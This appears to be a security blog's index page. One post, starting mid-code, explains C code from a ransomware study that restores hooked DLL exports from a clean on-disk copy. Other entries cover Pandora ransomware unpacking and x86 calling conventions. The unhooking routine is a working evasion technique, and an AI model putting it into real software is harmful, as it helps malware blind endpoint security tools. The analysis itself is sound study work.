(!hFile)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">DWORD Size = <span class="number">0</span>;</span><br><span class="line">    DWORD H;</span><br><span class="line">    LARGE_INTEGER LargeInt;</span><br><span class="line">    pGetFileSizeEx(hFile, &amp;LargeInt);</span><br><span class="line">    Size = LargeInt.QuadPart;</span><br><span class="line">    <span class="keyword">if</span> (!Size)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">hFileMap = apCreateFileMappingW(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hFileMap)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">originDll = (LPBYTE)apMapViewOfFile(hFileMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, Size);</span><br><span class="line">    <span class="keyword">if</span> (!originDll)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFileMap);</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取modules-NT-Header"><a href="#获取modules-NT-Header" class="headerlink" title="获取modules NT Header"></a>获取modules NT Header</h2><blockquote>
<p>在 IMAGE_DOS_HEADER 结构体中的 e_lfanew 成员指定了 NT 头的偏移为 000000f0。这两个范围中间就是 DOS stub 的偏移区域。</p>
<p>计算NT头的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PNTHeader = ImageBase + dosHeader -&gt;e_Ifanew</span><br></pre></td></tr></table></figure>

<p>根据NT_headers 找到OptionalHeader</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line"></span><br><span class="line">DWORD Signature;</span><br><span class="line"></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line"></span><br><span class="line">DWORD Signature;</span><br><span class="line"></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>

<p>Optional Headers</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span></span><br><span class="line"> WORD        Magic;</span><br><span class="line"> BYTE        MajorLinkerVersion;</span><br><span class="line"> BYTE        MinorLinkerVersion;</span><br><span class="line"> DWORD       SizeOfCode;</span><br><span class="line"> DWORD       SizeOfInitializedData;</span><br><span class="line"> DWORD       SizeOfUninitializedData;</span><br><span class="line"> DWORD       AddressOfEntryPoint;</span><br><span class="line"> DWORD       BaseOfCode;</span><br><span class="line"> ULONGLONG   ImageBase;</span><br><span class="line"> DWORD       SectionAlignment;</span><br><span class="line"> DWORD       FileAlignment;</span><br><span class="line"> WORD        MajorOperatingSystemVersion;</span><br><span class="line"> WORD        MinorOperatingSystemVersion;</span><br><span class="line"> WORD        MajorImageVersion;</span><br><span class="line"> WORD        MinorImageVersion;</span><br><span class="line"> WORD        MajorSubsystemVersion;</span><br><span class="line"> WORD        MinorSubsystemVersion;</span><br><span class="line"> DWORD       Win32VersionValue;</span><br><span class="line"> DWORD       SizeOfImage;</span><br><span class="line"> DWORD       SizeOfHeaders;</span><br><span class="line"> DWORD       CheckSum;</span><br><span class="line"> WORD        Subsystem;</span><br><span class="line"> WORD        DllCharacteristics;</span><br><span class="line"> ULONGLONG   SizeOfStackReserve;</span><br><span class="line"> ULONGLONG   SizeOfStackCommit;</span><br><span class="line"> ULONGLONG   SizeOfHeapReserve;</span><br><span class="line"> ULONGLONG   SizeOfHeapCommit;</span><br><span class="line"> DWORD       LoaderFlags;</span><br><span class="line"> DWORD       NumberOfRvaAndSizes;</span><br><span class="line"> IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure>

<p>IMAGE_DATA_DIRECTORY结构如下</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220418213329225.png" alt="image-20220418213329225"></p>
</blockquote>
<h2 id="检查文件位数，并获取IMAGE-DATA-DIRECTORY数据。"><a href="#检查文件位数，并获取IMAGE-DATA-DIRECTORY数据。" class="headerlink" title="检查文件位数，并获取IMAGE_DATA_DIRECTORY数据。"></a>检查文件位数，并获取<code>IMAGE_DATA_DIRECTORY</code>数据。</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the File Offset of the modules NT Header</span></span><br><span class="line">uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic)</span><br><span class="line">&#123;</span><br><span class="line">    uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32)</span><br><span class="line">        uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic)</span><br><span class="line">    &#123;</span><br><span class="line">        uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64)</span><br><span class="line">            uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFileMap);</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后根据<code>uiBaseAddress</code>和<code>uiExportDir</code>获取如下数据</p>
<ul>
<li>export directory</li>
<li>name pointers</li>
<li>the array of addresses</li>
<li>the array of name ordinals</li>
<li>the number of exported functions</li>
</ul>
<blockquote>
<p>结构体<code>_IMAGE_EXPORT_DIRECTORY</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line"> DWORD   Characteristics;</span><br><span class="line"> DWORD   TimeDateStamp;</span><br><span class="line"> WORD    MajorVersion;</span><br><span class="line"> WORD    MinorVersion;</span><br><span class="line"> DWORD   Name;</span><br><span class="line"> DWORD   Base;</span><br><span class="line"> DWORD   NumberOfFunctions;</span><br><span class="line"> DWORD   NumberOfNames;</span><br><span class="line"> DWORD   AddressOfFunctions;     // RVA from base of image</span><br><span class="line"> DWORD   AddressOfNames;         // RVA from base of image</span><br><span class="line"> DWORD   AddressOfNameOrdinals;  // RVA from base of image</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the File Offset of the export directory</span></span><br><span class="line">    uiExportDir = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of name pointers</span></span><br><span class="line">    uiNameArray = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames, uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">    uiAddressArray = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions,</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of name ordinals</span></span><br><span class="line">    uiNameOrdinals = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals,</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a counter for the number of exported functions...</span></span><br><span class="line">    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;NumberOfNames;</span><br></pre></td></tr></table></figure>

<h2 id="获取导出函数表"><a href="#获取导出函数表" class="headerlink" title="获取导出函数表"></a>获取导出函数表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic)</span><br><span class="line">    &#123;</span><br><span class="line">        uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32)</span><br><span class="line">            uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic)</span><br><span class="line">        &#123;</span><br><span class="line">            uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64)</span><br><span class="line">                uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            pCloseHandle(hFileMap);</span><br><span class="line">            pCloseHandle(hFile);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="检查hook"><a href="#检查hook" class="headerlink" title="检查hook"></a>检查hook</h2><ul>
<li>遍历函数<ul>
<li>检查是否有转发函数（这个概念还不是很清楚），若是则跳过</li>
<li>比较当前函数和系统中函数是否相同<ul>
<li>若函数已经被hook，则利用函数的前5byte进行覆盖，即antihook</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; dwCounter--; uiNameArray += <span class="keyword">sizeof</span>(DWORD), uiNameOrdinals += <span class="keyword">sizeof</span>(WORD))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* cpExportedFunctionName = (<span class="type">char</span>*)(uiBaseAddress</span><br><span class="line">            + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">        uiAddressArray = uiBaseAddress</span><br><span class="line">            + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions,</span><br><span class="line">                uiBaseAddress);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use the functions name ordinal as an index into the array of name pointers</span></span><br><span class="line">    		<span class="comment">// loop the uiAddressArray with the uiNameOrdinals</span></span><br><span class="line">        uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// compute the File Offset to the function code</span></span><br><span class="line">        UINT_PTR funcAddr = uiBaseAddress + Rva2Offset(DEREF_32(uiAddressArray),</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line"> 				<span class="comment">// pass the for</span></span><br><span class="line">        <span class="type">bool</span> isForwarder = isForwardedFunc((<span class="type">const</span> <span class="type">void</span>*)funcAddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isForwarder) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>* funcHooked = apGetProcAddress(hmodule, cpExportedFunctionName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!funcHooked) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        BYTE* p = (BYTE*)funcHooked;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (p[<span class="number">0</span>] != <span class="number">0xe9</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[<span class="number">0</span>] != <span class="number">0xff</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (p[<span class="number">1</span>] != <span class="number">0x25</span>) <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __MINGW32__</span></span><br><span class="line">        <span class="type">bool</span> funcIsHooked = (<span class="built_in">memcmp</span>((<span class="type">const</span> <span class="type">void</span>*)funcAddr, (<span class="type">const</span> <span class="type">void</span>*)funcHooked, <span class="number">2</span>) != <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">bool</span> funcIsHooked = m_memcmp((<span class="type">const</span> <span class="type">void</span>*)funcAddr, (<span class="type">const</span> <span class="type">void</span>*)funcHooked, <span class="number">2</span>) != <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// __MINGW32</span></span></span><br><span class="line">        <span class="keyword">if</span> (!funcIsHooked) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">        DWORD oldProtect1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);</span></span><br><span class="line"><span class="comment">        VirtualProtectFunc pVirtualProtect = (VirtualProtectFunc)GetProcAddress(hKernel32,</span></span><br><span class="line"><span class="comment">            _STR(&quot;VirtualProtect&quot;));</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!apVirtualProtect(funcHooked, <span class="number">64</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//memcpy((void*)funcHooked, (void*)funcAddr, 10);</span></span><br><span class="line">        CopyMemory((<span class="type">void</span>*)funcHooked, (<span class="type">void</span>*)funcAddr, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!apVirtualProtect(funcHooked, <span class="number">64</span>, oldProtect, &amp;oldProtect1))</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/Ransomeware/" title="Ransomeware">Ransomeware </a><span class="leancloud_visitors"></span><span>About 919 words, 3 min 3 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/13/Pandora-Ransomeware-fla-unpack/">Pandora-Ransomeware-fla-unpack</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Pandora-Ransomware"><a href="#Pandora-Ransomware" class="headerlink" title="Pandora Ransomware"></a>Pandora Ransomware</h1><p>[TOC]</p>
<h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>First of all, I love oalabs. Below of code is copied from his research, and I get a lot from just repeat it. And maybe there are also bogus-control-flow in this sample however.</p>
<p>Sample: <code>5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b</code></p>
<p>Unpacked sample: <code>2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7</code> on the malshare(by the oalabs)</p>
<p><strong>References</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://synthesis.to/2021/03/03/flattening_detection.html">Control Flow Flattening</a></li>
<li><a target="_blank" rel="noopener" href="https://research.openanalysis.net/pandora/ransomware/malware/unpacking/dumpulator/emulation/2022/03/19/]https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html">Deobfuscation - Recovering an ollvm</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mrexodia/dumpulator">dumpulator</a></li>
<li><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/112">Control Flow Unflattening</a></li>
<li><a target="_blank" rel="noopener" href="https://malshare.com/sample.php?action=detail&hash=5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b">malshare</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=SulC2l1Dvbo&t=1s">oalabs</a></li>
</ul></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-13</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ollvm-dumpulator-ransomeware/" title="ollvm dumpulator ransomeware">ollvm dumpulator ransomeware </a><span class="leancloud_visitors"></span><span>About 3456 words, 11 min 31 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/07/calling-convention/">calling-convention</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Calling-Conventions"><a href="#Calling-Conventions" class="headerlink" title="Calling Conventions"></a>Calling Conventions</h1><p>There are different calling conventions for different operating systems <strong>or</strong> different bits of system<br><strong>or</strong> you compile with the vs (or others)</p>
<ul>
<li>Different conventions based on processor,OS,and Language Describe how are passed to functions</li>
<li>Describe how are returned from functions</li>
<li>Describe if the caller or callee <code>clean the stack</code></li>
<li>Resonsible for function and<code>prologue</code>and<code>epilogue</code></li>
</ul>
<h2 id="Windows-x86-Calling-Convention"><a href="#Windows-x86-Calling-Convention" class="headerlink" title="Windows x86 Calling Convention"></a>Windows x86 Calling Convention</h2><table>
<thead>
<tr>
<th align="left">Keyword</th>
<th align="left">Stack cleanup</th>
<th align="left">Parameter passing</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/cdecl?view=msvc-170">__cdecl</a></td>
<td align="left">Caller</td>
<td align="left">Pushes parameters on the stack, in reverse order (right to left)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/clrcall?view=msvc-170">__clrcall</a></td>
<td align="left">n&#x2F;a</td>
<td align="left">Load parameters onto CLR expression stack in order (left to right).</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-170">__stdcall</a></td>
<td align="left">Callee</td>
<td align="left">Pushes parameters on the stack, in reverse order (right to left)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170">__fastcall</a></td>
<td align="left">Callee</td>
<td align="left">Stored in registers, then pushed on stack</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/thiscall?view=msvc-170">__thiscall</a></td>
<td align="left">Callee</td>
<td align="left">Pushed on stack; <strong><code>this</code></strong> pointer stored in ECX</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/vectorcall?view=msvc-170">__vectorcall</a></td>
<td align="left">Callee</td>
<td align="left">Stored in registers, then pushed on stack in reverse order (right to left)</td>
</tr>
</tbody></table>
<ul>
<li>All arguments are widened to 32 bits(DWORD)</li>
<li>Return value is widened to 32 bits(DWORD)</li>
<li>Return values up to 32 bits are returned to <code>eax</code> register</li>
<li>Return values of 64 bit size(QWORD) are returned in EDX:EAX(The main value is in the EDX Register)</li>
<li>Return Structures are returned by reference with a pointer in EAX</li>
<li>Registers ESI,EDI,EBX,and EBP are restored(non-volatile)</li>
<li>MSDN is your friend</li>
</ul>
<h3 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a><code>__cdecl</code></h3><ul>
<li><p>Default calling convention for c and c++</p>
</li>
<li><p>Arguments are passed on the stack(pushed right-to-left)</p>
</li>
<li><p>Called is responsible for stack cleanup will (cdecl will clean the stack )</p>
<ul>
<li><p>this is important when there are variadic functions,so function doesn’t</p>
<p>worry about stack cleaning.</p>
</li>
</ul>
</li>
<li><p>Supports varag(variadic)functions</p>
</li>
</ul>
<p>Example code below:</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220407182649772.png" alt="image-20220407182649772"></p>
<p>then we can get follow code with ida</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220407182717320-20220407202633645-20220407202659160.png" alt="image-20220407182717320"></p>
<ul>
<li>sub_401090 is the hello1 function</li>
<li>sub_401000 is the addingNumberVariadic function which is variadic<ul>
<li>notice that caller clean the stack when the function return</li>
</ul>
</li>
</ul>
<h3 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h3><p>The <strong><code>__stdcall</code></strong> calling convention is used to call Win32 API functions. <code>The callee cleans the stack</code>, so the compiler makes <code>vararg</code> functions <strong><code>__cdecl</code></strong>. Functions that use this calling convention require a function prototype. The <strong><code>__stdcall</code></strong> modifier is Microsoft-specific.</p>
<table>
<thead>
<tr>
<th>Element</th>
<th>Implementation</th>
</tr>
</thead>
<tbody><tr>
<td>Argument-passing order</td>
<td>Right to left.</td>
</tr>
<tr>
<td>Argument-passing convention</td>
<td>By value, unless a pointer or reference type is passed.</td>
</tr>
<tr>
<td>Stack-maintenance responsibility</td>
<td>Called function pops its own arguments from the stack.</td>
</tr>
<tr>
<td>Name-decoration convention</td>
<td>An underscore (<code>_</code>) is prefixed to the name. The name is followed by the at sign (<code>@</code>) followed by the number of bytes (in decimal) in the argument list. Therefore, the function declared as <code>int func( int a, double b )</code> is decorated as follows: <code>_func@12</code></td>
</tr>
</tbody></table>
<h3 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h3><p>The <strong><code>__fastcall</code></strong> calling convention specifies that arguments to functions are to be passed in registers, when possible. This calling convention only applies to the x86 architecture. The following list shows the implementation of this calling convention.</p>
<table>
<thead>
<tr>
<th align="left">Element</th>
<th align="left">Implementation</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Argument-passing order</td>
<td align="left">The first two DWORD or smaller arguments that are found in the argument list from left to right are passed in ECX and EDX registers; all other arguments are passed on the stack from right to left.</td>
</tr>
<tr>
<td align="left">Stack-maintenance responsibility</td>
<td align="left">Called function pops the arguments from the stack.</td>
</tr>
<tr>
<td align="left">Name-decoration convention</td>
<td align="left">At sign (@) is prefixed to names; an at sign followed by the number of bytes (in decimal) in the parameter list is suffixed to names.</td>
</tr>
<tr>
<td align="left">Case-translation convention</td>
<td align="left">No case translation performed.</td>
</tr>
</tbody></table>
<h3 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall"></a>__thiscall</h3><p>The <strong>Microsoft-specific</strong> <strong><code>__thiscall</code></strong> calling convention is used on C++ class member functions on the x86 architecture. It’s the default calling convention used by member functions that don’t use variable arguments (<code>vararg</code> functions).</p>
<p>Under __thiscall, <code>the callee cleans the stack</code>, which is impossible for <code>vararg functions</code>. Arguments are pushed on the stack from right to left. <u>The <strong><code>this</code></strong> pointer is passed via register ECX, and not on the stack</u>.</p>
<blockquote>
<p><code>vararg</code> member functions use the <strong><code>__cdecl</code></strong> calling convention. All function arguments are pushed on the stack, with the <strong><code>this</code></strong> pointer placed on the stack last.</p>
</blockquote>
<p>Because this calling convention applies only to C++, it doesn’t have a C name decoration scheme.</p>
<p>When you define a non-static class member function out-of-line, specify the calling convention modifier only in the declaration. You don’t have to specify it again on the out-of-line definition. The compiler uses the calling convention specified during declaration at the point of definition.</p>
